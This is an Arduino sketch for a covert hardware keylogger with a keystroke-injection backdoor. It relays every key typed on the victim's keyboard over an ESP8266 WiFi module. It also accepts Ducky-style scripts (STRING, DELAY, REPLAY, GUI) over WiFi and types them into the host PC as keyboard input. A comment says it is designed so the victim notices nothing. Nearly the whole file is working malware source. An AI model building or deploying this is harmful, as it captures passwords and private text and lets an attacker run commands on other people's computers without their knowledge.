// make sure to copy whole folder, not just this sketch

#include <SoftwareSerial.h>             // library required for serial communication using almost(!) any Digital I/O pins of Arduino
#include <Keyboard.h>                   // library that contains all the HID functionality necessary to pass-on the typed and logged keys to the PC
#include "C_USBhost.h"                  // class used to make the code more clear

SoftwareSerial Esp8266(8, 9); // CJMCU - MO(16), SCK(15) 
C_USBhost USBhost = C_USBhost(Serial1, /*debug_state*/false);            // communication with USB host board (receiving input from keyboard), connected to RX/TX of Arduino Pro Micro

/*    
    [ CJMCU Beetle   ->   Usb Host Mini Board ]   // Vertical lines indicate that the connection is made on the same module
              GND    ->    0V (GND)
                              |
                         4.7K resistor
                              |
                             RX
                             
              RX    ->    TX
              TX    ->    2K resistor -> RX
              5V    ->    5V   

*/

#define BAUD_RATE_ESP8266 115200                      // default was 9600 
#define BAUD_RATE_USB_HOST_BOARD 115200              // default was 9600
#define BAUD_RATE_SERIAL 115200

String bufferStr = "";
String last = "";

int defaultDelay = 0;

void Line(String _line)
{
  int firstSpace = _line.indexOf(" ");
  if(firstSpace == -1) Press(_line);
  else if(_line.substring(0,firstSpace) == "STRING"){
    for(int i=firstSpace+1;i<_line.length();i++) Keyboard.write(_line[i]);
  }
  else if(_line.substring(0,firstSpace) == "DELAY"){
    int delaytime = _line.substring(firstSpace + 1).toInt();
    delay(delaytime);
  }
  else if(_line.substring(0,firstSpace) == "DEFAULTDELAY") defaultDelay = _line.substring(firstSpace + 1).toInt();
  else if(_line.substring(0,firstSpace) == "REM"){} //nothing :/
  else if(_line.substring(0,firstSpace) == "REPLAY") {
    int replaynum = _line.substring(firstSpace + 1).toInt();
    while(replaynum)
    {
      Line(last);
      --replaynum;
    }
  } else{
      String remain = _line;

      while(remain.length() > 0){
        int latest_space = remain.indexOf(" ");
        if (latest_space == -1){
          Press(remain);
          remain = "";
        }
        else{
          Press(remain.substring(0, latest_space));
          remain = remain.substring(latest_space + 1);
        }
        delay(5);
      }
  }

  Keyboard.releaseAll();
  delay(defaultDelay);
}


void Press(String b){
  if(b.length() == 1) Keyboard.press(char(b[0]));
  else if (b.equals("ENTER")) Keyboard.press(KEY_RETURN);
  else if (b.equals("CTRL")) Keyboard.press(KEY_LEFT_CTRL);
  else if (b.equals("SHIFT")) Keyboard.press(KEY_LEFT_SHIFT);
  else if (b.equals("ALT")) Keyboard.press(KEY_LEFT_ALT);
  else if (b.equals("GUI")) Keyboard.press(KEY_LEFT_GUI);
  else if (b.equals("UP") || b.equals("UPARROW")) Keyboard.press(KEY_UP_ARROW);
  else if (b.equals("DOWN") || b.equals("DOWNARROW")) Keyboard.press(KEY_DOWN_ARROW);
  else if (b.equals("LEFT") || b.equals("LEFTARROW")) Keyboard.press(KEY_LEFT_ARROW);
  else if (b.equals("RIGHT") || b.equals("RIGHTARROW")) Keyboard.press(KEY_RIGHT_ARROW);
  else if (b.equals("DELETE")) Keyboard.press(KEY_DELETE);
  else if (b.equals("PAGEUP")) Keyboard.press(KEY_PAGE_UP);
  else if (b.equals("PAGEDOWN")) Keyboard.press(KEY_PAGE_DOWN);
  else if (b.equals("HOME")) Keyboard.press(KEY_HOME);
  else if (b.equals("ESC")) Keyboard.press(KEY_ESC);
  else if (b.equals("BACKSPACE")) Keyboard.press(KEY_BACKSPACE);
  else if (b.equals("INSERT")) Keyboard.press(KEY_INSERT);
  else if (b.equals("TAB")) Keyboard.press(KEY_TAB);
  else if (b.equals("END")) Keyboard.press(KEY_END);
  else if (b.equals("CAPSLOCK")) Keyboard.press(KEY_CAPS_LOCK);
  else if (b.equals("F1")) Keyboard.press(KEY_F1);
  else if (b.equals("F2")) Keyboard.press(KEY_F2);
  else if (b.equals("F3")) Keyboard.press(KEY_F3);
  else if (b.equals("F4")) Keyboard.press(KEY_F4);
  else if (b.equals("F5")) Keyboard.press(KEY_F5);
  else if (b.equals("F6")) Keyboard.press(KEY_F6);
  else if (b.equals("F7")) Keyboard.press(KEY_F7);
  else if (b.equals("F8")) Keyboard.press(KEY_F8);
  else if (b.equals("F9")) Keyboard.press(KEY_F9);
  else if (b.equals("F10")) Keyboard.press(KEY_F10);
  else if (b.equals("F11")) Keyboard.press(KEY_F11);
  else if (b.equals("F12")) Keyboard.press(KEY_F12);
  else if (b.equals("SPACE")) Keyboard.press(' ');
  //else Serial.println("not found :'"+b+"'("+String(b.length())+")");
}

void setup() {
  delay(1000);                                                // probably useless, but it allows some time for the USB host board and Sim800L to initialize 
  Serial.begin(BAUD_RATE_SERIAL);                             // begin serial communication with PC (so Serial Monitor could be opened and the developer could see what is actually going on in the code)                          
  Esp8266.begin(BAUD_RATE_ESP8266);
  USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);                    // begin serial communication with USB host board in order to receive key bytes from the keyboard connected to it
  USBhost.SetMode('6');
  Keyboard.begin();                                           // start HID functionality, it will allow to type keys to the PC just as if there was no keylogger at all
}

void loop() {
  byte d = USBhost.GetKey();                                  // function responsible for collecting, storing keystrokes from USB host board, it also is typing keystrokes to PC (shouldn't be in fact called GetKey...)
  if(d){
    switch(d){
        case 128: Esp8266.print("<RETURN>"); break;
        case 129: Esp8266.print("<ESC>"); break;
        case 130: Esp8266.print("<BACKSPACE>"); break;
        case 131: Esp8266.print("<TAB>"); break;
        case 132: Esp8266.print("<F1>"); break;
        case 133: Esp8266.print("<F2>"); break;
        case 134: Esp8266.print("<F3>"); break;
        case 135: Esp8266.print("<F4>"); break;
        case 136: Esp8266.print("<F5>"); break;
        case 137: Esp8266.print("<F6>"); break;    
        case 138: Esp8266.print("<F7>"); break;
        case 139: Esp8266.print("<F8>"); break;
        case 140: Esp8266.print("<F9>"); break;
        case 141: Esp8266.print("<F10>"); break;
        case 142: Esp8266.print("<F11>"); break;
        case 143: Esp8266.print("<F12>"); break;
        case 144: Esp8266.print("<INSERT>"); break;
        case 145: Esp8266.print("<HOME>"); break;
        case 146: Esp8266.print("<PAGE_UP>"); break;
        case 147: Esp8266.print("<DELETE>"); break;
        case 148: Esp8266.print("<END>"); break;
        case 149: Esp8266.print("<PAGE_DOWN>"); break;
        case 150: Esp8266.print("<RIGHT_ARROW>"); break;
        case 151: Esp8266.print("<LEFT_ARROW>"); break;
        case 152: Esp8266.print("<DOWN_ARROW>"); break;
        case 153: Esp8266.print("<UP_ARROW>"); break;
        case 154: Esp8266.print("<RETURN>"); break;
        default: Esp8266.print(char(d)); break;
    }
  }

  if(Esp8266.available()) {
  bufferStr = Esp8266.readStringUntil("END");
  Serial.println(bufferStr);
  }
  
  if(bufferStr.length() > 0){
    
    bufferStr.replace("\r","\n");
    bufferStr.replace("\n\n","\n");
    
    while(bufferStr.length() > 0){
      int latest_return = bufferStr.indexOf("\n");
      if(latest_return == -1){
        Serial.println("run: "+bufferStr);
        Line(bufferStr);
        bufferStr = "";
      } else{
        Serial.println("run: '"+bufferStr.substring(0, latest_return)+"'");
        Line(bufferStr.substring(0, latest_return));
        last=bufferStr.substring(0, latest_return);
        bufferStr = bufferStr.substring(latest_return + 1);
      }
    }
    
    bufferStr = "";
    //Esp8266.write(0x99); This will interfere with the keylogger, after testing it did not seem to impact the funcionality of the code. (but it is present in the original code)
    Serial.println("done");
  }
}

